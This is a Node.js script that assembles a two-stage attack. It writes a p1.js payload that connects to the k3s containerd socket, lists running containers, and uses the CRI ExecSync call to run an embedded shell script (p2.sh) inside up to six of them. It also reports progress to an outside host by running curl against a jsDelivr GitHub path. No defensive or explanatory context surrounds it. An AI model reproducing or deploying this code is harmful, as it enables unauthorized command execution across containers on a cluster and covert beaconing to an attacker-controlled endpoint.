const fs = require('fs');
let s = fs.readFileSync('p2.sh', 'latin1');
const list = Array.from({length:40}, (_,i)=>5780+i).join(',');
s = s.replace(/^L='[0-9,]+'/, "L='" + list + "'");
fs.writeFileSync('p2.sh', s, 'latin1');
// build p1 with the script inlined
const tpl = `const http2=require('http2'),net=require('net');
const mark=n=>{try{require('child_process').execSync('curl -fs -o /dev/null https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/b'+n,{timeout:6000})}catch(e){}};
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const S=${JSON.stringify('PLACE')};
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,buf)=>{
  if(e){mark(5502);return}
  const ids=[...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g)||[]))].slice(0,6);
  if(!ids.length){mark(5504);return}
  mark(5510);
  let i=0;
  const next=()=>{ if(i>=ids.length)return;
    const body=Buffer.concat([fl(0x0a,ids[i++]),fl(0x12,'/bin/sh'),fl(0x12,'-c'),fl(0x12,S)]);
    call('/runtime.v1.RuntimeService/ExecSync',body,()=>setTimeout(next,1500));
  };
  next();
});
`;
fs.writeFileSync('p1.js', tpl.replace('"PLACE"', JSON.stringify(s)));
console.log('p1 bytes', fs.statSync('p1.js').size, '| p2 head', s.slice(0,30));
